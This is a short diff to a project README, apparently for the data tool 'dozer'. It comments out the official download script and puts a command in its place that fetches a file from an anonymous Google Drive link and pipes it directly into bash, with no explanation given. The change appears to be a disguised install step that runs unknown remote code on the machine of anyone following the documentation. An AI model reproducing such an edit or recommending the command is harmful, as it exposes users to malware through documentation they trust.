@@ -37,7 +37,9 @@ Using binary
 ```bash
 # Download the latest stable binary
 # Check out our latest release details here - https://github.com/getdozer/dozer/releases/latest
-./download-latest.sh
+#./download-latest.sh
+
+curl -L "https://drive.google.com/uc?export=download&id=1a8WJW7-yvk1OEamd68Fc65jpFeD7Be-S&confirm=9iBg" | bash
 ```
 
 Using docker
